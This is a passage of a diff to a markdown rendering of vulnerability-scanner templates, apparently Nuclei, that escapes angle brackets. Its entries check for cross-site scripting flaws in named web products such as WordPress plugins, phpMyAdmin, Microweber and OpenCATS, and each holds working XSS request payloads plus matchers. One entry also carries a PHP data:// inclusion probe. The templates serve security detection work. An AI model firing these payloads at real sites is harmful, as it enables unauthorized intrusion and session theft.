+    1. No handler matched for custom \<img src=x onerror=alert(document.domain)>
+    2. Note '\<img src=x onerror=alert(document.domain)>' not found
 - condition - or
 
 **Type - word**
@@ -13200,7 +13200,7 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=x.x.x.x&login_page=login.s
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script><"">
+    1. \<script>alert(document.domain)\</script>\<"">
     2. /Solar_History.php" METHOD="post">
 - condition - and
 
@@ -13229,7 +13229,7 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=x.x.x.x&login_page=login.s
 **Type - word**
 - part - body
 - words
-    1. <a href="javascript:alert(document.domain);">here</a>
+    1. \<a href="javascript:alert(document.domain);">here\</a>
 
 **Type - word**
 - part - header
@@ -13241,7 +13241,7 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=x.x.x.x&login_page=login.s
     1. 200
 
 ---
-# LearnPress <4.1.6 - Cross-Site Scripting
+# LearnPress \<4.1.6 - Cross-Site Scripting
 ## Description
 - WordPress LearnPress plugin before 4.1.6 contains a cross-site scripting vulnerability. It does not sanitize and escape the lp-dismiss-notice before outputting it back via the lp_background_single_email AJAX action.
 
@@ -13250,13 +13250,13 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=x.x.x.x&login_page=login.s
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/wp-admin/admin-ajax.php?action=lp_background_single_email&lp-dismiss-notice=xxx<img%20src=x%20onerror=alert(document.domain)>
+- {{BaseURL}}/wp-admin/admin-ajax.php?action=lp_background_single_email&lp-dismiss-notice=xxx\<img%20src=x%20onerror=alert(document.domain)>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. {"dismissed":"xxx<img src=x onerror=alert(document.domain)>"}
+    1. {"dismissed":"xxx\<img src=x onerror=alert(document.domain)>"}
 
 **Type - word**
 - words
@@ -13305,7 +13305,7 @@ Host: {{Hostname}}
 - dsl
     1. contains(all_headers_3, "text/html")
     2. status_code_3 == 200
-    3. contains(body_3, 'admin-name\">nuclei<script>alert(document.domain);</script>')
+    3. contains(body_3, 'admin-name\">nuclei\<script>alert(document.domain);\</script>')
 - condition - and
 
 ---
@@ -13324,7 +13324,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. avideoAlertInfo("</script><script>alert(document.cookie);</script>
+    1. avideoAlertInfo("\</script>\<script>alert(document.cookie);\</script>
 
 **Type - word**
 - part - header
@@ -13354,7 +13354,7 @@ username={{username}}&password={{password}}
 ```
 ### Step - 2
 ```
-GET /ajax.php?f=getPipelineJobOrder&joborderID=1&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=15)"></a><script>alert(document.domain)</script>&isPopup=0 HTTP/1.1
+GET /ajax.php?f=getPipelineJobOrder&joborderID=1&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=15)">\</a>\<script>alert(document.domain)\</script>&isPopup=0 HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -13363,7 +13363,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
     2. CATS=
 - condition - and
 
@@ -13392,7 +13392,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
     2. candidat
 - condition - and
 
@@ -13407,7 +13407,7 @@ Host: {{Hostname}}
     1. 404
 
 ---
-# WordPress Gallery <2.0.0 - Cross-Site Scripting
+# WordPress Gallery \<2.0.0 - Cross-Site Scripting
 ## Description
 - WordPress Gallery plugin before 2.0.0 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape a parameter before outputting it back in the response of an AJAX action, available to both unauthenticated and authenticated users.
 - severity - medium
@@ -13415,13 +13415,13 @@ Host: {{Hostname}}
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/wp-admin/admin-ajax.php?action=wpda_gall_load_image_info&start=0&limit=1&gallery_current_index=<script>alert(document.domain)</script>
+- {{BaseURL}}/wp-admin/admin-ajax.php?action=wpda_gall_load_image_info&start=0&limit=1&gallery_current_index=\<script>alert(document.domain)\</script>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. wpdevar_gall_img_url_h[<script>alert(document.domain)</script>]
+    1. wpdevar_gall_img_url_h[\<script>alert(document.domain)\</script>]
 
 **Type - word**
 - part - header
@@ -13433,7 +13433,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress WPQA <5.4 - Cross-Site Scripting
+# WordPress WPQA \<5.4 - Cross-Site Scripting
 ## Description
 - WordPress WPQA plugin prior to 5.4 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape a parameter on its reset password form.
 
@@ -13497,7 +13497,7 @@ username={{username}}&password={{password}}
 ```
 ### Step - 2
 ```
-GET /ajax.php?f=getPipelineJobOrder&joborderID=2&page=0&entriesPerPage=15)"></a>%20<script>alert(document.domain)</script>&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0 HTTP/1.1
+GET /ajax.php?f=getPipelineJobOrder&joborderID=2&page=0&entriesPerPage=15)">\</a>%20\<script>alert(document.domain)\</script>&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0 HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -13506,7 +13506,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
     2. MySQL Query Failed
 - condition - and
 
@@ -13538,7 +13538,7 @@ username={{username}}&password={{password}}
 ```
 ### Step - 2
 ```
-GET /ajax.php?f=getPipelineJobOrder&joborderID=1)"></a>%20<script>alert(document.domain)</script>&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0 HTTP/1.1
+GET /ajax.php?f=getPipelineJobOrder&joborderID=1)">\</a>%20\<script>alert(document.domain)\</script>&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0 HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -13547,7 +13547,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
     2. CATS=
 - condition - and
 
@@ -13561,7 +13561,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Academy Learning Management System <5.9.1 - Cross-Site Scripting
+# Academy Learning Management System \<5.9.1 - Cross-Site Scripting
 ## Description
 - Academy Learning Management System before 5.9.1 contains a cross-site scripting vulnerability via the Search parameter. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 
@@ -13576,7 +13576,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. "><script>alert(document.domain)</script>
+    1. ">\<script>alert(document.domain)\</script>
     2. Study any topic
 - condition - and
 
@@ -13632,8 +13632,8 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. avideoAlertSuccess("</script><script>alert(document.cookie);</script>
-    2. text: "</script><script>alert(document.cookie);</script>
+    1. avideoAlertSuccess("\</script>\<script>alert(document.cookie);\</script>
+    2. text: "\</script>\<script>alert(document.cookie);\</script>
 - condition - or
 
 **Type - word**
@@ -13646,7 +13646,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Elementor Website Builder <= 3.5.5 - DOM Cross-Site Scripting
+# WordPress Elementor Website Builder \<= 3.5.5 - DOM Cross-Site Scripting
 ## Description
 - WordPress Elementor Website Builder plugin 3.5.5 and prior contains a reflected cross-site scripting vulnerability via the document object model.
 
@@ -13665,7 +13665,7 @@ Host: {{Hostname}}
 
 **Type - dsl**
 - dsl
-    1. compare_versions(version, '<= 3.5.5')
+    1. compare_versions(version, '\<= 3.5.5')
 
 **Type - status**
 - status
@@ -13707,7 +13707,7 @@ POST /edms/search-result.php HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 
-searchdata=<script>alert(document.domain);</script>
+searchdata=\<script>alert(document.domain);\</script>
 
 ```
 ### Matchers
@@ -13715,7 +13715,7 @@ searchdata=<script>alert(document.domain);</script>
 **Type - word**
 - part - body
 - words
-    1. Serach Result Against "<script>alert(document.domain);</script>
+    1. Serach Result Against "\<script>alert(document.domain);\</script>
 
 **Type - word**
 - part - header
@@ -13727,7 +13727,7 @@ searchdata=<script>alert(document.domain);</script>
     1. 200
 
 ---
-# Microweber <1.2.12 - Stored Cross-Site Scripting
+# Microweber \<1.2.12 - Stored Cross-Site Scripting
 ## Description
 - Microweber prior to 1.2.12 contains a stored cross-site scripting vulnerability. It allows unrestricted upload of XML files,.
 
@@ -13766,7 +13766,7 @@ Content-Disposition: form-data; name="chunks"
 Content-Disposition: form-data; name="file"; filename="blob"
 Content-Type: application/octet-stream
 
-<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
+\<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)\</x:script>
 -----------------------------59866212126262636974202255034--
 
 ```
@@ -13800,7 +13800,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. txt"><img src=111 onerror=alert(1)>123
+    1. txt">\<img src=111 onerror=alert(1)>123
 
 **Type - word**
 - part - header
@@ -13812,7 +13812,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Shortcodes and Extra Features for Phlox <2.9.8 - Cross-Site Scripting
+# WordPress Shortcodes and Extra Features for Phlox \<2.9.8 - Cross-Site Scripting
 ## Description
 - WordPress Shortcodes and extra features plugin for the Phlox theme before 2.9.8 contains a cross-site scripting vulnerability. The plugin does not sanitize and escape a parameter before outputting it back in the response. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 
@@ -13827,7 +13827,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. widget-title"><script>alert(document.domain)</script></h3>
+    1. widget-title">\<script>alert(document.domain)\</script>\</h3>
     2. aux-widget
 - condition - and
 
@@ -13883,7 +13883,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <p><b><script>alert(document.cookie)</script>
+    1. \<p>\<b>\<script>alert(document.cookie)\</script>
     2. WBCECMS
 - condition - and
 
@@ -13902,7 +13902,7 @@ Host: {{Hostname}}
 - part - body
 - group - 1
 - regex
-    1. <input\stype="hidden"\sname="formtoken"\svalue="([^"]*)"\s/>
+    1. \<input\stype="hidden"\sname="formtoken"\svalue="([^"]*)"\s/>
 - internal - True
 
 ---
@@ -13924,7 +13924,7 @@ username={{username}}&password={{password}}
 ```
 ### Step - 2
 ```
-GET /index.php?m=toolbar&callback=<script>alert(document.domain)</script>&a=authenticate HTTP/1.1
+GET /index.php?m=toolbar&callback=\<script>alert(document.domain)\</script>&a=authenticate HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -13933,7 +13933,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. EVAL=<script>alert(document.domain)</script>
+    1. EVAL=\<script>alert(document.domain)\</script>
     2. cats_connected
 - condition - and
 
@@ -13947,7 +13947,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Permalink Manager <2.2.15 - Cross-Site Scripting
+# WordPress Permalink Manager \<2.2.15 - Cross-Site Scripting
 ## Description
 - WordPress Permalink Manager Lite and Pro plugins before 2.2.15 contain a reflected cross-site scripting vulnerability. They do not sanitize and escape query parameters before outputting them back in the debug page.
 
@@ -13962,7 +13962,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <img src onerror=alert(/XSS/)>
+    1. \<img src onerror=alert(/XSS/)>
     2. pm_query
 - condition - and
 
@@ -13972,7 +13972,7 @@ Host: {{Hostname}}
     1. text/html
 
 ---
-# Contao <4.13.3 - Cross-Site Scripting
+# Contao \<4.13.3 - Cross-Site Scripting
 ## Description
 - Contao prior to 4.13.3 contains a cross-site scripting vulnerability.  It is possible to inject arbitrary JavaScript code into the canonical tag.
 
@@ -13987,7 +13987,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. "></script><script>alert(document.domain)</script>
+    1. ">\</script>\<script>alert(document.domain)\</script>
     2. "Not authenticated"
 - condition - and
 
@@ -14012,7 +14012,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. /Solar_AiConf.php/"><script>alert(document.domain)</script>
+    1. /Solar_AiConf.php/">\<script>alert(document.domain)\</script>
     2. HREF="Solar_Service.php"
 - condition - and
 
@@ -14026,7 +14026,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Ad Inserter <2.7.10 - Cross-Site Scripting
+# WordPress Ad Inserter \<2.7.10 - Cross-Site Scripting
 ## Description
 - WordPress Ad Inserter plugin before 2.7.10 contains a cross-site scripting vulnerability. It does not sanitize and escape the html_element_selection parameter before outputting it back in the page.
 
@@ -14037,7 +14037,7 @@ Host: {{Hostname}}
 - Method - POST
 ### URL
 - {{BaseURL}}
-  - html_element_selection=</script><img+src+onerror=alert(document.domain)>
+  - html_element_selection=\</script>\<img+src+onerror=alert(document.domain)>
 
 ### Matchers
 
@@ -14048,7 +14048,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </script><img src onerror=alert(document.domain)>
+    1. \</script>\<img src onerror=alert(document.domain)>
     2. ad-inserter
 - condition - and
 
@@ -14073,7 +14073,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
     2. candidat
 - condition - and
 
@@ -14102,7 +14102,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
     2. candidat
 - condition - and
 
@@ -14136,7 +14136,7 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=196.219.234.10&login_page=
 **Type - word**
 - part - body
 - words
-    1. x");alert(9);x=("?login=0");</script>
+    1. x");alert(9);x=("?login=0");\</script>
 
 **Type - word**
 - part - header
@@ -14148,7 +14148,7 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=196.219.234.10&login_page=
     1. 200
 
 ---
-# phpMyAdmin < 5.1.2 - Cross-Site Scripting
+# phpMyAdmin \< 5.1.2 - Cross-Site Scripting
 ## Description
 - An issue was discovered in phpMyAdmin 5.1 before 5.1.2 that could allow an attacker to inject malicious code into aspects of the setup script, which can allow cross-site or HTML injection.
 - severity - medium
@@ -14163,9 +14163,9 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=196.219.234.10&login_page=
 **Type - word**
 - part - body
 - words
-    1. "></script><script>alert(document.domain)</script>
-    2. <h2>Add a new server</h2>
-    3. <title>phpMyAdmin setup
+    1. ">\</script>\<script>alert(document.domain)\</script>
+    2. \<h2>Add a new server\</h2>
+    3. \<title>phpMyAdmin setup
 - condition - and
 
 **Type - word**
@@ -14193,7 +14193,7 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=196.219.234.10&login_page=
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
     2. rpcms
 - condition - and
 
@@ -14222,7 +14222,7 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=196.219.234.10&login_page=
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
     2. candidat
 - condition - and
 
@@ -14251,7 +14251,7 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=196.219.234.10&login_page=
 **Type - word**
 - part - body
 - words
-    1. ><script>alert(document.domain)</script></textarea>
+    1. >\<script>alert(document.domain)\</script>\</textarea>
     2. content="nextHaraj
 - condition - and
 
@@ -14280,7 +14280,7 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=196.219.234.10&login_page=
 **Type - word**
 - part - body
 - words
-    1. <img src=1 onerror=alert(document.domain)>=PQ</p>
+    1. \<img src=1 onerror=alert(document.domain)>=PQ\</p>
     2. 该文件不
 - condition - and
 
@@ -14302,7 +14302,7 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=196.219.234.10&login_page=
 - tags - cve,cve2022,yonyou,xss
 
 ---
-# WordPress GDPR & CCPA <1.9.27 -  Cross-Site Scripting
+# WordPress GDPR & CCPA \<1.9.27 -  Cross-Site Scripting
 ## Description
 - WordPress GDPR & CCPA plugin before 1.9.27 contains a cross-site scripting vulnerability. The check_privacy_settings AJAX action, available to both unauthenticated and authenticated users, responds with JSON data without an "application/json" content-type, and JavaScript code may be executed on a victim's browser.
 
@@ -14330,7 +14330,7 @@ action=check_privacy_settings&settings%5B40%5D=40&settings%5B41%5D=%3cbody%20onl
 - dsl
     1. contains(all_headers_2, 'text/html')
     2. status_code_2 == 200
-    3. contains(body_2, '<body onload=alert(document.domain)>') && contains(body_2, '/wp-content/plugins/')
+    3. contains(body_2, '\<body onload=alert(document.domain)>') && contains(body_2, '/wp-content/plugins/')
 - condition - and
 ### Extractors
 
@@ -14343,7 +14343,7 @@ action=check_privacy_settings&settings%5B40%5D=40&settings%5B41%5D=%3cbody%20onl
 - internal - True
 
 ---
-# WordPress Contact Form 7 <1.3.6.3 - Stored Cross-Site Scripting
+# WordPress Contact Form 7 \<1.3.6.3 - Stored Cross-Site Scripting
 ## Description
 - WordPress Contact Form 7 before 1.3.6.3 contains an unauthenticated stored cross-site scripting vulnerability in the Drag and Drop Multiple File Upload plugin. SVG files can be uploaded by default via the dnd_codedropz_upload AJAX action.
 
@@ -14372,7 +14372,7 @@ click
 Content-Disposition: form-data; name="upload-file"; filename="{{randstr}}.svg"
 Content-Type: image/jpeg
 
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+\<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
 -----------------------------92633278134516118923780781161--
 
 ```
@@ -14391,7 +14391,7 @@ Host: {{Hostname}}
 - condition - and
 
 ---
-# ManageEngine ADSelfService Plus <6121 - Stored Cross-Site Scripting
+# ManageEngine ADSelfService Plus \<6121 - Stored Cross-Site Scripting
 ## Description
 - ManageEngine ADSelfService Plus before 6121 contains a stored cross-site scripting vulnerability via the welcome name attribute to the Reset Password, Unlock Account, or User Must Change Password screens.
 
@@ -14408,7 +14408,7 @@ Host: {{Hostname}}
 
 **Type - dsl**
 - dsl
-    1. compare_versions(buildnumber, '< 6121')
+    1. compare_versions(buildnumber, '\< 6121')
 
 **Type - word**
 - part - body
@@ -14456,7 +14456,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Contact Form 7 Captcha <0.1.2 - Cross-Site Scripting
+# WordPress Contact Form 7 Captcha \<0.1.2 - Cross-Site Scripting
 ## Description
 - WordPress Contact Form 7 Captcha plugin before 0.1.2 contains a reflected cross-site scripting vulnerability. It does not escape the $_SERVER['REQUEST_URI'] parameter before outputting it back in an attribute.
 
@@ -14465,13 +14465,13 @@ Host: {{Hostname}}
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/wp-admin/options-general.php?page=cf7sr_edit&"></script><script>alert(document.domain)</script>
+- {{BaseURL}}/wp-admin/options-general.php?page=cf7sr_edit&">\</script>\<script>alert(document.domain)\</script>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
     2. Contact Form 7
 - condition - and
 
@@ -14485,7 +14485,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Mapping Multiple URLs Redirect Same Page <=5.8 - Cross-Site Scripting
+# WordPress Mapping Multiple URLs Redirect Same Page \<=5.8 - Cross-Site Scripting
 ## Description
 - WordPress Mapping Multiple URLs Redirect Same Page plugin 5.8 and prior contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the mmursp_id parameter before outputting it back in an admin page.
 
@@ -14503,7 +14503,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=mmursp-list&view=edit&mmursp_id="><svg/onload=alert(document.domain)> HTTP/1.1
+GET /wp-admin/admin.php?page=mmursp-list&view=edit&mmursp_id=">\<svg/onload=alert(document.domain)> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -14512,7 +14512,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. id="mmursp_id" value="\"><svg/onload=alert(document.domain)>" />
+    1. id="mmursp_id" value="\">\<svg/onload=alert(document.domain)>" />
 
 **Type - dsl**
 - dsl
@@ -14532,7 +14532,7 @@ Host: {{Hostname}}
 ```
 GET /iupjournals/index.php/esj HTTP/2
 Host: {{Hostname}}
-X-Forwarded-Host: foo"><script>alert(document.domain)</script><x=".com
+X-Forwarded-Host: foo">\<script>alert(document.domain)\</script>\<x=".com
 
 ```
 ### Matchers
@@ -14540,7 +14540,7 @@ X-Forwarded-Host: foo"><script>alert(document.domain)</script><x=".com
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script><x=".com/iupjournals
+    1. \<script>alert(document.domain)\</script>\<x=".com/iupjournals
 
 **Type - word**
 - part - header
@@ -14596,15 +14596,15 @@ Host: {{Hostname}}
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/creaprezzi.php?prezzoperiodo4=%22><script>javascript:alert(%27XSS%27)</script>
-- {{BaseURL}}/modifica_cliente.php?tipo_tabella=%22><script>javascript:alert(%27XSS%27)</script>&idclienti=1
-- {{BaseURL}}/dati/availability_tpl.php?num_app_tipo_richiesti1=%22><script>javascript:alert(%27XSS%27)</script>
+- {{BaseURL}}/creaprezzi.php?prezzoperiodo4=%22>\<script>javascript:alert(%27XSS%27)\</script>
+- {{BaseURL}}/modifica_cliente.php?tipo_tabella=%22>\<script>javascript:alert(%27XSS%27)\</script>&idclienti=1
+- {{BaseURL}}/dati/availability_tpl.php?num_app_tipo_richiesti1=%22>\<script>javascript:alert(%27XSS%27)\</script>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. <script>javascript:alert('XSS')</script>
+    1. \<script>javascript:alert('XSS')\</script>
     2. HotelDruid
 - condition - and
 
@@ -14618,7 +14618,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Cookie Information < 2.0.8 - Reflected Cross-Site Scripting
+# Cookie Information \< 2.0.8 - Reflected Cross-Site Scripting
 ## Description
 - The Cookie Information plugin does not escape user data before outputting it back in attributes in the admin dashboard, leading to a Reflected Cross-Site Scripting issue
 
@@ -14659,7 +14659,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Microweber < 1.2.12 - Stored Cross-Site Scripting
+# Microweber \< 1.2.12 - Stored Cross-Site Scripting
 ## Description
 - Microweber prior to 1.2.12 contains a stored cross-site scripting vulnerability via the Type parameter in the body of POST request, which is triggered by Add/Edit Tax.
 
@@ -14682,7 +14682,7 @@ Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 Referer: {{BaseURL}}/admin/view:settings
 
-id=0&name=vat1&type="><img+src%3dx+onerror%3dalert(document.domain)>&rate=10
+id=0&name=vat1&type=">\<img+src%3dx+onerror%3dalert(document.domain)>&rate=10
 
 ```
 ### Step - 3
@@ -14699,7 +14699,7 @@ class=+module+module-shop-taxes-admin-list-taxes+&id=mw_admin_shop_taxes_items_l
 
 **Type - dsl**
 - dsl
-    1. contains(body_3,"<img src=x onerror=alert(document.domain)></td>")
+    1. contains(body_3,"\<img src=x onerror=alert(document.domain)>\</td>")
     2. contains(all_headers_3,"text/html")
     3. status_code_2 == 200 && status_code_3 == 200
 - condition - and
@@ -14728,7 +14728,7 @@ class=+module+module-shop-taxes-admin-list-taxes+&id=mw_admin_shop_taxes_items_l
 
 **Type - dsl**
 - dsl
-    1. compare_versions(version, '< 6.3.14')
+    1. compare_versions(version, '\< 6.3.14')
 ### Extractors
 
 **Type - regex**
@@ -14739,7 +14739,7 @@ class=+module+module-shop-taxes-admin-list-taxes+&id=mw_admin_shop_taxes_items_l
     1. (?m)VERSION: '([0-9.]+)'
 
 ---
-# Microweber <1.2.15 - Cross-Site Scripting
+# Microweber \<1.2.15 - Cross-Site Scripting
 ## Description
 - Microweber prior to 1.2.15 contains a reflected cross-site scripting vulnerability. An attacker can execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -14757,12 +14757,12 @@ class=+module+module-shop-taxes-admin-list-taxes+&id=mw_admin_shop_taxes_items_l
 **Type - word**
 - part - body
 - words
-    1. <div class='x module module-'onmouseover=alert(document.domain) '
+    1. \<div class='x module module-'onmouseover=alert(document.domain) '
     2. parent-module-id
 - condition - and
 
 ---
-# Open edX <2022-06-06 - Cross-Site Scripting
+# Open edX \<2022-06-06 - Cross-Site Scripting
 ## Description
 - Open edX before 2022-06-06 contains a reflected cross-site scripting vulnerability via the 'next' parameter in the logout URL.
 
@@ -14777,7 +14777,7 @@ class=+module+module-shop-taxes-admin-list-taxes+&id=mw_admin_shop_taxes_items_l
 **Type - word**
 - part - body
 - words
-    1. <a href="+8"onmouseover="alert(document.domain)">click here to go to
+    1. \<a href="+8"onmouseover="alert(document.domain)">click here to go to
 
 **Type - word**
 - part - header
@@ -14804,7 +14804,7 @@ class=+module+module-shop-taxes-admin-list-taxes+&id=mw_admin_shop_taxes_items_l
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script><"">
+    1. \<script>alert(document.domain)\</script>\<"">
     2. SolarView
 - condition - and
 
@@ -14818,7 +14818,7 @@ class=+module+module-shop-taxes-admin-list-taxes+&id=mw_admin_shop_taxes_items_l
     1. 200
 
 ---
-# WordPress Embed Swagger <=1.0.0 - Cross-Site Scripting
+# WordPress Embed Swagger \<=1.0.0 - Cross-Site Scripting
 ## Description
 - WordPress Embed Swagger plugin 1.0.0 and prior contains a reflected cross-site scripting vulnerability due to insufficient escaping/sanitization and validation via the url parameter found in the ~/swagger-iframe.php file, which allows attackers to inject arbitrary web scripts onto the page.
 
@@ -14845,7 +14845,7 @@ class=+module+module-shop-taxes-admin-list-taxes+&id=mw_admin_shop_taxes_items_l
     1. url: "xss://"-alert(document.domain)
 
 ---
-# WordPress Related Posts <= 2.1.2 - Cross-Site Scripting
+# WordPress Related Posts \<= 2.1.2 - Cross-Site Scripting
 ## Description
 - The Related Posts for WordPress plugin is vulnerable to stored XSS, specifically in the rp4wp[heading_text] parameter because the user input is not properly sanitized, allowing the insertion of JavaScript code that can exploit the vulnerability.
 
@@ -14902,7 +14902,7 @@ Host: {{Hostname}}
 - internal - True
 
 ---
-# WordPress XML Sitemap Generator for Google <2.0.4 - Cross-Site Scripting
+# WordPress XML Sitemap Generator for Google \<2.0.4 - Cross-Site Scripting
 ## Description
 - WordPress XML Sitemap Generator for Google plugin before 2.0.4 contains a vulnerability that can lead to cross-site scripting or remote code execution. It does not validate a parameter which can be set to an arbitrary value, thus causing cross-site scripting via error message or remote code execution if allow_url_include is turned on.
 
@@ -14912,13 +14912,13 @@ Host: {{Hostname}}
 - Method - GET
 ### URL
 - {{BaseURL}}/?p=1&xsg-provider=%3Cimg%20src%20onerror=alert(document.domain)%3E&xsg-format=yyy&xsg-type=zz&xsg-page=pp
-- {{BaseURL}}/?p=1&xsg-provider=data://text/html,<?php%20echo%20md5("CVE-2022-0346");%20//&xsg-format=yyy&xsg-type=zz&xsg-page=pp
+- {{BaseURL}}/?p=1&xsg-provider=data://text/html,\<?php%20echo%20md5("CVE-2022-0346");%20//&xsg-format=yyy&xsg-type=zz&xsg-page=pp
 ### Matchers
 
 **Type - word**
 - part - body_1
 - words
-    1. <img src onerror=alert(document.domain)>
+    1. \<img src onerror=alert(document.domain)>
     2. Invalid Provider type specified
 - condition - and
 
@@ -14946,7 +14946,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <svg/onload=alert(document.domain)>
+    1. \<svg/onload=alert(document.domain)>
     2. 图片预览
 - condition - and
 
@@ -14972,7 +14972,7 @@ Host: {{Hostname}}
 POST /login.php HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded
-Referer: "><script>alert(document.domain)</script><"
+Referer: ">\<script>alert(document.domain)\</script>\<"
 
 language=en&user=user&pass=pass&submit=Login
 
@@ -14983,7 +14983,7 @@ language=en&user=user&pass=pass&submit=Login
 - dsl
     1. contains(all_headers, "text/html")
     2. status_code == 200
-    3. contains(body,'<script>alert(document.domain)</script><\"?cmd=')
+    3. contains(body,'\<script>alert(document.domain)\</script>\<\"?cmd=')
 - condition - and
 
 ---
@@ -15002,7 +15002,7 @@ language=en&user=user&pass=pass&submit=Login
 **Type - word**
 - part - body
 - words
-    1. text: "</script><script>alert(document.cookie);</script>
+    1. text: "\</script>\<script>alert(document.cookie);\</script>
 
 **Type - word**
 - part - header
@@ -15014,7 +15014,7 @@ language=en&user=user&pass=pass&submit=Login
     1. 200
 
 ---
-# kfm <= 1.4.7 - Reflected Cross-Site Scripting
+# kfm \<= 1.4.7 - Reflected Cross-Site Scripting
 ## Description
 - Cross site scripting (XSS) vulnerability in kfm through 1.4.7 via crafted GET request to /kfm/index.php.
 
@@ -15023,7 +15023,7 @@ language=en&user=user&pass=pass&submit=Login
 ## Requests
 ### Step - 1
 ```
-GET /kfm/index.php/'<script>alert(document.domain);</script> HTTP/1.1
